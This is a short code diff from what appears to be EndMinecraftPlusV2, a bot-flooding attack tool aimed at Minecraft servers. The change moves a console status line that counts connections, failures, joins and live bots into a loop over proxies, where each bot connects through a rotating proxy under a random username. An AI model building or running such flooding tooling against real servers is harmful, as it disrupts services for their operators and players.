@@ -141,8 +141,6 @@ public class NewBotAttack extends IAttack {
         if (this.attack_tab) {
             tabThread = new Thread(() -> {
                 while (true) {
-                    SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joined + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);
-
                     for (Session c : clients) {
                         if (c.isConnected() && c.hasFlag("join")) {
                             if (ProtocolLibs.adaptAfter758) {
@@ -197,6 +195,8 @@ public class NewBotAttack extends IAttack {
 
         for (String p: ProxyUtil.proxies) {
             try {
+                SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joined + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);
+
                 String[] _p = p.split(":");
                 Proxy proxy = new Proxy(proxyType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
                 String[] User = AttackManager.getRandomUser().split("@");
